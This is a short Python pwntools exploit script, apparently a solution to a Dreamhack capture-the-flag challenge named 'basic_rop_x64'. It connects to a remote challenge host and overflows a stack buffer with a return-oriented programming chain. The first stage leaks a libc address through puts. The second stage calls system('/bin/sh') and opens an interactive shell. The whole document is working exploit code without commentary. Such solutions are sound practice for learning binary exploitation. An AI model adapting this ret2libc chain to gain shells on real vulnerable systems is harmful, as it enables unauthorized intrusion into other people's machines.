from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

p = remote("host3.dreamhack.games",21611)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")

pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
puts_plt = e.plt['puts']
read_got = e.got['read']

main = e.symbols['main']


payload = b"A"*0x48
payload += p64(pop_rdi)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)

p.send(payload)

print(p.recvuntil('A'*0x40))

leak = u64(p.recv(6)+b'\x00\x00')
lb = leak - libc.symbols['read']
system = lb + libc.symbols['system']
binsh = lb + list(libc.search(b"/bin/sh"))[0]

payload2 = b"B"*0x48
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)    

p.send(payload2)

p.interactive()
